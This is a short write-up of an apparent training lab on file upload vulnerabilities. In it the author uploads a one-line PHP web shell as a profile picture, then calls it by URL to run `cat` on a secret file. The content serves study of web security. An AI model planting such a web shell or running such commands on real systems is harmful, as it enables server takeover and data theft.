# Lab: Remote Code Execution via Web Shell Upload

**Difficulty:** Apprentice | **Category:** File Upload Vulnerabilities

The goal was to upload a PHP web shell and use it to read `/home/carlos/secret`.

Opened the site and looked for anywhere I could upload something. Found the profile picture upload after logging in with the provided credentials `wiener:peter`. Created a PHP web shell in the terminal:

```bash
nano portswiggerexploit.php
```

```php
<?php echo system($_GET['command']); ?>
```

Uploaded it as a profile picture — the server accepted it with no validation. Checked Burp Suite's HTTP history to find where the file was stored. When a website loads a profile picture, it fetches it from a path on the server — that's how the file location was found:

```
/files/avatars/portswiggerexploit.php
```

Called the shell directly in the browser to read the secret:

```
https://<lab-id>.web-security-academy.net/files/avatars/portswiggerexploit.php?command=cat%20/home/carlos/secret
```

The output returned the secret — lab solved.

**Key takeaway:** The server stored uploaded files directly in a web-accessible directory with zero validation, making it possible to upload and execute a PHP script just by visiting its URL.
